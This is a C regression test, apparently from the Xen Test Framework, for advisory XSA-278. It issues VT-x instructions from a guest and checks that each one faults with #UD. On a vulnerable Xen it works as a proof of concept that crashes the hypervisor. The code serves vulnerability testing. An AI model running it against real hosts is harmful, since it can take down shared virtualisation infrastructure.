/**
 * @file tests/xsa-278/main.c
 * @ref test-xsa-278
 *
 * @page test-xsa-278 XSA-278
 *
 * Advisory: [XSA-278](https://xenbits.xen.org/xsa/advisory-278.html)
 *
 * Between
 * [ac6a4500b](https://xenbits.xen.org/gitweb/?p=xen.git;a=commitdiff;h=ac6a4500b2bed47fa135afbf8e4caeb4b3df546d)
 * (Xen 4.9) and XSA-278, Xen incorrectly handled its concept of "in VMX
 * mode", and allowed the use of the VT-x instructions before VMXON had
 * completed.
 *
 * Check that when CR4.VMXE is viewed as clear, all other VT-x instructions
 * raise @#UD, and that when the VMX CPUID bit is clear, CR4.VMXE can't be
 * enabled.
 *
 * If Xen is vulnerable, it will most likely crash with a NULL pointer
 * dereference.
 *
 * @see tests/xsa-278/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-278 PoC";

static exinfo_t stub_vmclear(void)
{
    exinfo_t ex = 0;
    uint64_t addr = 0;

    asm volatile ("1: vmclear %[ptr]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex)
                  : [ptr] "m" (addr),
                    [rec] "p" (ex_record_fault_edi));

    return ex;
}

static exinfo_t stub_vmptrld(void)
{
    exinfo_t ex = 0;
    uint64_t addr = 0;

    asm volatile ("1: vmptrld %[ptr]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex)
                  : [ptr] "m" (addr),
                    [rec] "p" (ex_record_fault_edi));

    return ex;
}

static exinfo_t stub_vmptrst(void)
{
    exinfo_t ex = 0;
    uint64_t addr;

    asm volatile ("1: vmptrst %[ptr]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex), [ptr] "=m" (addr)
                  : [rec] "p" (ex_record_fault_edi));

    return ex;
}

static exinfo_t stub_vmread(void)
{
    exinfo_t ex = 0;
    unsigned long tmp;

    asm volatile ("1: vmread %[field], %[value]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex), [value] "=rm" (tmp)
                  : [field] "r" (0l),
                    [rec] "p" (ex_record_fault_edi));

    return ex;
}

static exinfo_t stub_vmwrite(void)
{
    exinfo_t ex = 0;

    asm volatile ("1: vmwrite %[value], %[field]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex)
                  : [field] "r" (0l), [value] "rm" (0l),
                    [rec] "p" (ex_record_fault_edi));

    return ex;
}

static exinfo_t stub_vmlaunch(void)
{
    exinfo_t ex = 0;

    asm volatile ("1: vmlaunch; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex)
                  : [rec] "p" (ex_record_fault_edi));

    return ex;
}

static exinfo_t stub_vmresume(void)
{
    exinfo_t ex = 0;

    asm volatile ("1: vmresume; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex)
                  : [rec] "p" (ex_record_fault_edi));

    return ex;
}

static exinfo_t stub_vmxoff(void)
{
    exinfo_t ex = 0;

    asm volatile ("1: vmxoff; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex)
                  : [rec] "p" (ex_record_fault_edi));

    return ex;
}

static exinfo_t stub_vmxon(void)
{
    exinfo_t ex = 0;
    uint64_t addr = ~0ull;

    asm volatile ("1: vmxon %[ptr]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex)
                  : [ptr] "m" (addr),
                    [rec] "p" (ex_record_fault_edi));

    return ex;
}

static exinfo_t stub_invept(void)
{
    exinfo_t ex = 0;
    struct { uint64_t eptp, rsvd; } desc;

    asm volatile ("1: invept %[desc], %[type]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex)
                  : [type] "r" (0l), [desc] "m" (desc),
                    [rec] "p" (ex_record_fault_edi));

    return ex;
}

static exinfo_t stub_invvpid(void)
{
    exinfo_t ex = 0;
    struct { uint64_t vpid, linear; } desc;

    asm volatile ("1: invvpid %[desc], %[type]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, %P[rec])
                  : "+D" (ex)
                  : [type] "r" (0l), [desc] "m" (desc),
                    [rec] "p" (ex_record_fault_edi));

    return ex;
}

static const struct test {
    const char *name;
    exinfo_t (*fn)(void);
} tests[] = {
    /* VMCS maintenance */
    { "vmclear",  stub_vmclear  },
    { "vmptrld",  stub_vmptrld  },
    { "vmptrst",  stub_vmptrst  },
    { "vmread",   stub_vmread   },
    { "vmwrite",  stub_vmwrite  },

    /* VMX management */
    { "vmlaunch", stub_vmlaunch },
    { "vmresume", stub_vmresume },
    { "vmxoff",   stub_vmxoff   },
    { "vmxon",    stub_vmxon    },

    /* TLB Management */
    { "invept",   stub_invept   },
    { "invvpid",  stub_invvpid  },
};

void test_main(void)
{
    unsigned int i;
    unsigned long cr4 = read_cr4();

    if ( cr4 & X86_CR4_VMXE )
    {
        xtf_error("Error: CR4.VMXE found unexpectedly set\n");
        write_cr4(cr4 & ~X86_CR4_VMXE);
    }

    for ( i = 0; i < ARRAY_SIZE(tests); ++i )
    {
        const struct test *t = &tests[i];
        exinfo_t ex = t->fn();

        if ( ex != EXINFO_SYM(UD, 0) )
            xtf_failure("Fail: %s, got %pe, expected #UD\n",
                        t->name, _p(ex));
    }

    if ( !cpu_has_vmx && !write_cr4_safe(cr4 | X86_CR4_VMXE) )
        xtf_failure("Fail: CR4.VMXE settable without feature\n");

    xtf_success("Success: Probably not vulnerable to XSA-278\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
